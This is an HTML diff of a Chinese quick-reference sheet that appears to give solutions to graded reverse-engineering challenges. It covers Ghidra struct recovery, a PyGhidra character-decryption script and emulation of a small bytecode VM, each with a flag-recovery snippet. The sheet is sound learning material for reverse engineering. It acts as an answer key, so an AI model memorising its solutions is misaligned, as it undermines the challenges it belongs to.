+  <div class="hd"><span class="g">G2</span> 链表校验 + 结构体还原<span class="tag">Data Type Manager 建 Node</span></div>
+  <p class="k">在 Data Type Manager 建 <code>Node{value1,value2,index,checksum,reserved,next}</code> 并建 <code>Node*</code>，Retype Variable 后伪代码立刻可读。遍历链表，checksum 通过就写 <code>value1^value2</code> 到 <code>index</code>。</p>
+<pre>s = b0 + b1 + b2
+if b2 &lt; 0x24 and b3 == ((s + 5 * (s // 0xFB)) &amp; 0xFF):
+    flag[b2] = chr(b0 ^ b1)</pre>
+</div>
+
+<div class="item">
+  <div class="hd"><span class="g">G3</span> PyGhidra 脚本读内存<span class="tag">Window → Script Manager → Create New Script</span></div>
+  <p class="k">核心是 <code>decrypt_char(p1,p2)</code>：<code>s = p1*7+3</code>，取 <code>strs[p1][p2]</code> 异或 <code>(s + s//251*5)</code>，最后 <code>&amp; 0x7f</code>。p1/p2 由 <code>ASSEMBLE_HI/LO</code> 拼出。</p>
+<pre>p1 = ((HI[i] &lt;&lt; 8) | LO[i]) &gt;&gt; 2
+p2 = LO[i] &amp; 3
+s  = p1 * 7 + 3
+c  = ((s + (s // 251) * 5) &amp; 0xFF) ^ strs[p1][p2]
+flag += chr(c &amp; 0x7F)</pre>
+</div>
+
+<div class="item">
+  <div class="hd"><span class="g">G4</span> 手写 VM 解释器模拟<span class="tag">opcode 0~5，字节码在 0x140004060</span></div>
+  <p class="k"><code>vm_run</code> 是一个极简栈机。直接在 PyGhidra 里按同样的语义跑一遍字节码，把 <code>buff[imm]</code> 收集起来就是 flag 内容，不必手算。</p>
+<pre>0 quit | 1 push imm | 2 xor | 3 rol1 | 4 add imm | 5 pop → buff[imm]
+<span class="c"># PyGhidra: 从 0x140004060 取 opcode，维护 72 字节栈与 sp/pc</span></pre>
+</div>
+</section>
+
+<div class="foot">
+  分级通关第三级 · 48 关速查 ｜ 排版按 A4 单页/方向设计，可直接双面打印装订
+</div>
+
+</div>
+</body>
+</html>
